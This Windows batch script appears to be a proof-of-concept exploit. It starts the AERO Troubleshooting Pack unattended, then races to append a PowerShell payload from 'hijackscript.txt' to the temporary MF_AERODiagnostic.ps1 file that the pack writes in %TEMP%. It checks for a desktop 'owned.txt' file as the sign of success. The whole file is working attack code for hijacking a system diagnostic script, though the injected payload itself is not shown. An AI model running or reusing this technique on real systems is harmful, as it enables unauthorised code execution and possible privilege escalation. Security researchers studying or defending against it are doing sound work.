@echo off
SETLOCAL

REM Delete any previous Troubleshooting Pack remnants
FOR /F %%X in ('dir /B /A:D "%TEMP%\SDIAG_*" 2^>nul') DO ( 
  del /S /F /Q %TEMP%\%%X >nul
)

REM Invoke the AERO Troubleshooting Pack in unattended mode.
REM I can't find any other way do this unattended. msdt.exe always launches the GUI.
REM Remove this line if you want to manually launch the GUI.
start "" "powershell.exe" -NoProfile -Command "$AEROPack = Get-TroubleshootingPack -Path C:\Windows\diagnostics\system\AERO | Invoke-TroubleshootingPack -Unattended"

REM Loop until %TEMP%\SDIAG_*\MF_AERODiagnostic.ps1 appears and then append hijackscript.txt PowerShell payload to it.
:loop
FOR /F %%X in ('dir /B /A:D "%TEMP%\SDIAG_*" 2^>nul') DO (  
  if exist "%TEMP%\%%X\MF_AERODiagnostic.ps1" (
    type "%CD%\hijackscript.txt" >> "%TEMP%\%%X\MF_AERODiagnostic.ps1"
    if exist "%USERPROFILE%\Desktop\owned.txt" (
      goto end
    )
  )
)
goto loop

:end